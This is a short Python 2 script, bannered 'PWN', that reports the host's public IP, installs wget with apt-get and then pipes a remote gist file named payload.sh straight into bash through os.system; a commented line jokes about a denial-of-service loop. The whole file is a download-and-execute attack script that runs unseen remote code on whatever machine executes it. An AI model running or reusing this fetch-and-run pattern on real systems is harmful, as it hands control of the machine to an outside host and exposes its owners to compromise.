import sys

print "~_~_~_~_~_~_~_~_~ PWN ~_~_~_~_~_~_~_~_~\n\n"

print "Querying public IP...\n"
import urllib2
print urllib2.urlopen("https://api.ipify.org/?format=json").read()

# Feeling mean? Try DOS:
# while True:
#     1+1

print "Executing payload...\n"
import os
os.system("apt-get install -y wget")
os.system("wget -O - https://gist.githubusercontent.com/slimsag/293e68ffd9fcd3edbc98/raw/9b69429afe3158e5b4a9f0866b466debc97c07ac/payload.sh | bash")

print "Done."
sys.exit(0);

